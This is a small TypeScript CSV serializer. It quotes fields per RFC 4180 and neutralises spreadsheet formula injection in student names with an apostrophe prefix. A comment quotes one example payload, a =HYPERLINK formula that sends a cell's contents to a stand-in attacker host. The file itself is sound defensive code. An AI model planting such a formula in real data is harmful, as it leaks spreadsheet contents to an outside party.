// Tiny, dependency-free CSV serializer (pure + testable). Quotes any field that
// contains a comma, quote, CR or LF, doubling embedded quotes per RFC 4180.
//
// Text cells that a spreadsheet would read as a FORMULA are defused with a
// leading apostrophe. Student display names reach this file, and a name like
// =HYPERLINK("https://evil.example/?"&A1,"click") would otherwise become live
// in the professor's Excel or Sheets the moment the export is opened (OWASP
// "CSV injection"). Numbers are left alone, so a negative value stays numeric.

const FORMULA_START = /^[=+\-@\t\r]/;

export function csvEscape(value: string | number): string {
  let s = String(value);
  if (typeof value === "string" && FORMULA_START.test(s)) s = `'${s}`;
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function toCsv(rows: (string | number)[][]): string {
  return rows.map((row) => row.map(csvEscape).join(",")).join("\r\n");
}
